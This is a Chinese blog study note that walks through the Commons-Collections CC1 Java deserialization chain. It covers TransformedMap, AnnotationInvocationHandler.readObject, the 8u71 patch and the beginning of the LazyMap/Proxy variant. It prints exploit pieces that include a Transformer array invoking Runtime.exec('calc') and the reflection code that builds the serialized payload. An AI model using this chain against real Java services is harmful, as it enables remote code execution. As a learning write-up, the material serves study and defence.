<p>这个类就是 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ，我们查看它的readObject ⽅法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line"> throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"> s.defaultReadObject();</span><br><span class="line"> // Check to make sure that types have not evolved incompatibly</span><br><span class="line"> AnnotationType annotationType = null;</span><br><span class="line"> try &#123;</span><br><span class="line"> annotationType = AnnotationType.getInstance(type);</span><br><span class="line"> &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line"> // Class is no longer an annotation type; time to punch out</span><br><span class="line"> throw new java.io.InvalidObjectException(&quot;Non-annotation type</span><br><span class="line">in annotation serial stream&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"> // If there are annotation members without values, that</span><br><span class="line"> // situation is handled by the invoke method.</span><br><span class="line"> for (Map.Entry&lt;String, Object&gt; memberValue :</span><br><span class="line">memberValues.entrySet()) &#123;</span><br><span class="line"> String name = memberValue.getKey();</span><br><span class="line"> Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line"> if (memberType != null) &#123; // i.e. member still exists</span><br><span class="line"> Object value = memberValue.getValue();</span><br><span class="line"> if (!(memberType.isInstance(value) ||</span><br><span class="line"> value instanceof ExceptionProxy)) &#123;</span><br><span class="line"> memberValue.setValue(</span><br><span class="line"> new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line"> value.getClass() + &quot;[&quot; + value +</span><br><span class="line">&quot;]&quot;).setMember(</span><br><span class="line"> annotationType.members().get(name)));</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>核⼼逻辑就是 <code>Map.Entry memberValue : memberValues.entrySet() 和 memberValue.setValue(...) </code>。</p>
<p><code>memberValues</code>就是反序列化后得到的Map，也是经过了<code>TransformedMap</code>修饰的对象，这⾥遍历了它 的所有元素，并依次设置值。</p>
<p>在调⽤<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>⾥注册的 Transform，进⽽执⾏我们为其精⼼设计的任意代码。</p>
<p> 所以，我们构造POC的时候，就需要创建⼀个<code>AnnotationInvocationHandler</code>对象，并将前⾯构造的 <code>HashMap</code>设置进来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class clazz =</span><br><span class="line">Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(true);</span><br><span class="line">Object obj = construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这⾥因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是⼀个内部类，不能直接使⽤ new来实例化。我使⽤反射获取到了它的构造⽅法，并将其设置成外部可⻅的，再调⽤就可以实例化 了。 </p>
<p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个Annotation类；第⼆个是 参数就是前⾯构造的Map。</p>
<p>我们构造了⼀个<code>AnnotationInvocationHandler</code>对象，它就是我们反序列化利⽤链的起点了。我 们通过如下代码将这个对象⽣成序列化流：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">oos.writeObject(obj);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure>

<p>在<code>writeObject</code>的时候出现异常了： <code>java.io.NotSerializableException: java.lang.Runtime </code>。</p>
<p>原因是，Java中不是所有对象都⽀持序列化，待序列化的对象和所有它使⽤的内部属性对象，必须都实 现了<code>java.io.Serializable</code>接⼝。⽽我们最早传给<code>ConstantTransformer的 </code>是 <code>Runtime.getRuntime() </code>，Runtime类是没有实现<code>java.io.Serializable</code>接⼝的，所以不允许被 序列化。</p>
<p>我们可以通过反射来获取到当前上下⽂中的Runtime对象，⽽不需要直接使⽤这个类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime r = (Runtime) f.invoke(null);</span><br><span class="line">r.exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>

<p>转换成Transformer的写法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line"> new ConstantTransformer(Runtime.class),</span><br><span class="line"> new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,new Class[0] &#125;),</span><br><span class="line"> new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line"> new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,new String[] &#123; &quot;calc&quot; &#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最⼤的区别就是将 Runtime.getRuntime() 换成了 Runtime.class ，前者是⼀ 个 java.lang.Runtime 对象，后者是⼀个 java.lang.Class 对象。Class类有实现Serializable接⼝， 所以可以被序列化。</p>
<p>修改Transformer数组后再次运⾏，发现这次没有报异常，⽽且输出了序列化后的数据流，但是反序列 化时仍然没弹出计算器，这是为什么呢？</p>
<p>这个实际上和AnnotationInvocationHandler类的逻辑有关，我们可以动态调试就会发现， 在 AnnotationInvocationHandler:readObject 的逻辑中，有⼀个if语句对var7进⾏判断，只有在其 不是null的时候才会进⼊⾥⾯执⾏setValue，否则不会进⼊也就不会触发漏洞：</p>
<p>那么如何让这个var7不为null呢？这⼀块我就不详细分析了，还会涉及到Java注释相关的技术。</p>
<p>直接给 出两个条件： </p>
<ol>
<li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第⼀个参数必须是 Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设⽅法名是X </li>
<li><ol start="2">
<li>被 TransformedMap.decorate 修饰的Map中必须有⼀个键名为X的元素 所以，这也解释了为什么我前⾯⽤到 Retention.class ，因为Retention有⼀个⽅法，名为value；所 以，为了再满⾜第⼆个条件，我需要给Map中放⼊⼀个Key是value的元素：</li>
</ol>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br></pre></td></tr></table></figure>



<p>再次修改POC，我们在本地进⾏测试，发现已经可以成功弹出计算器了： 但是，当你兴冲冲地拿着这串序列化流，跑到服务器上进⾏反序列化时就会发现，⼜⽆法成功执⾏命令 了。这⼜是为什么呢？ 前⽂说了，我们是在Java 8u71以前的版本上进⾏测试的，</p>
<p>在8u71以后⼤概是2015年12⽉的时候，Java 官⽅修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数：http:// hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</p>
<p>改动后，不再直接 使⽤反序列化得到的Map对象，⽽是新建了⼀个LinkedHashMap对象，并将原来的键值添加进去。 所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，⽽原来我们精⼼构造的Map不再执 ⾏set或put操作，也就不会触发RCE了。</p>
<h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>对于demo版本的exp来说  首先看的是<code>TransformedMap</code></p>
<blockquote>
<p>它是用来对Map类型数据做修饰的，当修饰之后的键或者值被修改之后，就会触发对应的回调方法。</p>
</blockquote>
<p>链子是在transform方法里执行命令的，所以接下来找哪个类调用了transform方法。</p>
<p>右键点击查找用法可快速查找什么类调用了transform方法。共有二十四处调用，这些调用的地方我们都可以看看，但为了节约时间，我直接定位到TransformedMap类的checkSetValue方法</p>
<p><img src="image-20230512172637419.png" alt="image-20230512172637419"></p>
<p>valueTransformer通过构造器赋值，但是函数类型为protected，只能本类调用。</p>
<p><img src="image-20230512172708548.png" alt="image-20230512172708548"></p>
<p>该类找到decorate方法，类似于装饰器。它实例化了本类，能够调用TransformedMap构造器并为valueTransformer赋值。那么回到checkSetValue方法，我们已经可以控制valueTransformer，那么接下来找哪个类的哪个方法调用了该方法。</p>
<p>去TransformedMap的父类Ab看看</p>
<p><img src="image-20230512172938421.png" alt="image-20230512172938421"></p>
<p>只有一处调用，MapEntry类的setValue方法。</p>
<p><img src="image-20230512173047660.png" alt="image-20230512173047660"></p>
<p>Entry代表map中的一个键值对，实际上MapEntry类重写了Map的setValue方法，跟进AbstractMapEntryDecorator抽象类，</p>
<p><img src="image-20230512173140655.png" alt="image-20230512173140655"></p>
<p>我们先通过对Map的遍历触发setValue方法，主要思路：实例化一个Map，put一个键值对，然后通过TransformedMap的decorate方法进行封装，最后进行遍历。</p>
<p>因此，EXP使用<code>TransformedMap.decorate</code>，修饰<code>innerMap</code>，得到修饰的结果<code>outMap</code>，只要outerMap的值发生了改变，就会触发<code>transformerChain</code>,从而触发RCE。</p>
<p><strong>因此接下来的问题关键就到了如何改变<code>outerMap</code>的值</strong></p>
<p>这里我们需要找到一个类，这给类具备<strong>在进行反序列化的readobject逻辑里有对Map数据类型的写入操作</strong></p>
<p>这里找到的类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p>
<p>查看它的反序列化方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function"> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"> s.defaultReadObject();</span><br><span class="line"> <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"> AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">	 annotationType = AnnotationType.getInstance(type);</span><br><span class="line"> &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">	 <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">	 <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">	Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">	<span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">	<span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">	<span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue :memberValues.entrySet()) &#123;</span><br><span class="line">		String name = memberValue.getKey();</span><br><span class="line">		Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">		<span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123; <span class="comment">// i.e. member still exists</span></span><br><span class="line">		 Object value = memberValue.getValue();</span><br><span class="line">			<span class="keyword">if</span> (!(memberType.isInstance(value) ||value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">					memberValue.setValue(<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">value.getClass() + <span class="string">&quot;[&quot;</span> + value +<span class="string">&quot;]&quot;</span>).setMember(annotationType.members().get(name)));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们发现一个操作：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue :memberValues.entrySet()) &#123;</span><br><span class="line"> 		String name = memberValue.getKey();</span><br><span class="line"> 		Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line"> 		<span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123; <span class="comment">// i.e. member still exists</span></span><br><span class="line">			 Object value = memberValue.getValue();</span><br><span class="line"> 			<span class="keyword">if</span> (!(memberType.isInstance(value) ||value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line"> 					memberValue.setValue(<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line"> value.getClass() + <span class="string">&quot;[&quot;</span> + value +<span class="string">&quot;]&quot;</span>).setMember(annotationType.members().get(name)));</span><br><span class="line"> 			&#125;</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;</span><br></pre></td></tr></table></figure>

<p>memberValues就是反序列化后得到的Map，如果它的值是我们前面TransformedMap修饰的对象，这⾥遍历了它的所有元素，并依次设置值。在调⽤setValue设置值的时候就会触发TransformedMap⾥注册的Transform，进⽽执⾏我们为其精⼼设计的任意代码</p>
<p>所以，我们构造POC的时候，就需要创建⼀个<code>AnnotationInvocationHandler</code>对象，并将前⾯构造的<code>HashMap</code>设置进来</p>
<p>这里我们需要注意”</p>
<ul>
<li><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>是一个内部类，不能直接使用<code>new</code>来实例化。我使用反射获取它的构造方法，并设置为外部可见，在调用就可以实例化了</p>
</li>
<li><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个<code>Annotation</code>类；第⼆个是</p>
<p>参数就是前⾯构造的Map</p>
</li>
</ul>
<h6 id="为啥Annotation使用Retention"><a href="#为啥Annotation使用Retention" class="headerlink" title="为啥Annotation使用Retention"></a>为啥Annotation使用Retention</h6><p>P牛在文章中提到在反序列化时，有一个<code>if</code>语句对var7进行判断，只有其不是null的时候才会进入执行<code>setValue</code>，否则不会进入也就不会触发漏洞</p>
<p>var7不为null的条件：</p>
<ul>
<li><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 构造函数的第⼀个参数必须是Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设⽅法名是X</li>
<li>被 TransformedMap.decorate 修饰的Map中必须有⼀个键名为X的元素</li>
</ul>
<p>所以，这解释了为什么前⾯⽤到 Retention.class ，因为Retention有⼀个⽅法，名为value；</p>
<p>所以，为了再满⾜第⼆个条件，需要给Map中放⼊⼀个Key是value的元素：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<h6 id="为啥只有Java-8u71以前的版本可以触发"><a href="#为啥只有Java-8u71以前的版本可以触发" class="headerlink" title="为啥只有Java 8u71以前的版本可以触发"></a>为啥只有Java 8u71以前的版本可以触发</h6><p>我们来看java 8u71以后的版本的<code>AnnotationInvocationHandler:：readobject</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField fields = s.readFields();</span><br><span class="line"></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(t);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">        <span class="comment">// consistent with runtime Map type</span></span><br><span class="line">        Map&lt;String, Object&gt; mv = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            Object value = <span class="keyword">null</span>;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                value = memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    value = <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            mv.put(name, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        UnsafeAccessor.setType(<span class="keyword">this</span>, t);</span><br><span class="line">        UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, mv);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对比观察前后两个代码，我们不难发现，在22行，发生了较大改动，不再直接使⽤反序列化得到的Map对象，⽽是新建了⼀个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，⽽原来我们精⼼构造的Map不再执⾏set或put操作，也就不会触发RCE了</p>
<h6 id="为啥Transformer里面要使用反射，而不是直接调用"><a href="#为啥Transformer里面要使用反射，而不是直接调用" class="headerlink" title="为啥Transformer里面要使用反射，而不是直接调用"></a>为啥Transformer里面要使用反射，而不是直接调用</h6><p>Java中不是所有对象都⽀持序列化，<strong>待序列化的对象和所有它使⽤的内部属性对象，必须都实现了java.io.Serializable接⼝</strong>。⽽我们最早传给ConstantTransformer的 是 Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接⼝的，所以不允许被序列化当</p>
<p>使用反射的时候，就将<code>Runtime.getRuntime() </code>换成了 <code>Runtime.class</code> ，前者是⼀个<code> java.lang.Runtime</code> 对象，后者是⼀个 <code>java.lang.Class</code> 对象。Class类有实现Serializable接⼝，所以可以被序列化</p>
<h4 id="个人的总结"><a href="#个人的总结" class="headerlink" title="个人的总结"></a>个人的总结</h4><p><code>TransformedMap</code>中 <code>checkSetValue</code> 中 <code>this.valueTransformer.transform(value);</code> 回调了<code>transform</code>  </p>
<p>-&gt;找<code>valueTransformer</code> 发现可控(protected只能本地方法调用 所以用decorate) 也就是 <code>this.valueTransformer.transform(value);</code>的value可控</p>
<p>-&gt; 问题到了怎么才能触发checkSetValue  通过查找TransformedMap 的父类<code>AbstractInputCheckedMapDecorator</code> 找到的MapEntry中的<code>value = this.parent.checkSetValue(value);</code> （没啥屌用。主要是个思路）</p>
<p>-&gt;继续看看哪个类的哪个函数调用了setValue方法，如果是readObject类调用了那就再好不过了。</p>
<p>-&gt;找到<code>AnnotationInvocationHandler</code>类的<code>readObject</code>方法调用了<code>setValue</code>方法 </p>
<p><img src="image-20230512174618811.png" alt="image-20230512174618811"></p>
<p>Runtime类不能被反序列化-&gt;可以通过反射获取到它的class对象 嵌套在InvokeTransformer中</p>
<p>但<code> AnnotationInvocationHandler</code>不能在包外实例化-&gt;需要反射来获得实例对象</p>
<p>需要满足readObject的两个if判断-&gt;</p>
<p>实际上这条链根本就没有调用setValue方法，打断点调试看看。</p>
<p><img src="1678333418_640955ea3d6e1d646fd3f.jpeg" alt="22.png"></p>
<p>第一个if就进不去，这个memberType实际上就是获取注解对象名为name的值，这个name，就是memberValues的键名。而这个memberValues是什么呢？我们创建的Map对象，我们设置的Override，跟进看一下，</p>
<p><img src="1678333420_640955eca275706358f03.jpeg" alt="23.png"></p>
<p>是没有值的，所以需要换一个注解，跟进Target看一下，</p>
<p><img src="1678333424_640955f017b6a98e7a885.jpeg" alt="24.png"></p>
<p>有value值，那就用它了。同时对于Map对象，需要put键值对，键名必须为value，键值随意。更改完成后，再跟进看一下</p>
<p><img src="1678333430_640955f68191a11f5a461.jpeg" alt="25.png"></p>
<p>完全满足两个if条件判断。</p>
<p>setValue方法的参数不可控 (为啥非得用ConstatTransformer)</p>
<p>实际上执行了setValue方法后会跟进到checkSetValue</p>
<p><img src="image-20230512175003095.png" alt="image-20230512175003095"></p>
<p>而这里的value不是我们想要的Runtime.class，也就是不可控。可以利用一个类ConstantTransformer，跟进看一下它的transform方法</p>
<p><img src="image-20230512175028447.png" alt="image-20230512175028447"></p>
<p>无论接收什么参数，返回一个固定值，而这个固定值可以通过构造器可控。也就是说，无论value被赋上什么值，只要它调用了ConstantTransformer的transform方法，结果我们都可控。在Transformer数组里实例化ConstantTransformer</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class)</span><br></pre></td></tr></table></figure>

<p><img src="image-20230512175110245.png" alt="image-20230512175110245"></p>
<p>在数组遍历时会调用transform将输入改变为Runtime对象。</p>
<h4 id="LazyMap类构建的链子"><a href="#LazyMap类构建的链子" class="headerlink" title="LazyMap类构建的链子"></a>LazyMap类构建的链子</h4><p>LazyMap和TransformedMap类似，都是来自于Common-Collection库，并继承AbstractMapDecorator。</p>
<p>LazyMap的漏洞触发点和TransformedMap唯一的差别是，Transformed Map是在写入元素的时候触发transform，而LazyMap是在其get方法中触发的<code>factory.transform</code>。其实这也是很好理解的，LazyMap的作用是”懒加载”，在get找不到值的时候，它会调用<code>factory.transform</code>方法去获取一个值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123; </span><br><span class="line">       <span class="comment">// create value for key if key is not currently in the map </span></span><br><span class="line">       <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123; </span><br><span class="line">           Object value = factory.transform(key); </span><br><span class="line">           map.put(key, value); </span><br><span class="line">           <span class="keyword">return</span> value; </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.get(key); </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>但是LazyMap的利用难度更高，因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的readObject方法中并没有直接调用到Map的get方法。</p>
<p>所以ysoserial找到另一种方法，<code>AnnotationInvocationHandler</code>类的invoke方法有调用到get。</p>
<p>那么只要我们能够调用<code>invoke</code>，就能构建EXP这里使用的是Java的对象代理</p>
<h5 id="Java对象代理"><a href="#Java对象代理" class="headerlink" title="Java对象代理"></a>Java对象代理</h5><p>作为静态语言，如果想要劫持一个对象内部的方法调用，实现类似PHP的魔术方法<code>__call</code>，我们需要用到<code>java.reflect.Proxy</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>

<p><code>Proxy.newProxyInstance</code>的第一个参数是ClassLoader，直接默认即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了<code>InvocationHandler</code>接口的对象，里面包含了具体代理的逻辑。</p>
<p>这里可以写一个例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map; <span class="function"><span class="keyword">public</span> <span class="title">ExampleInvocationHandler</span><span class="params">(Map map)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

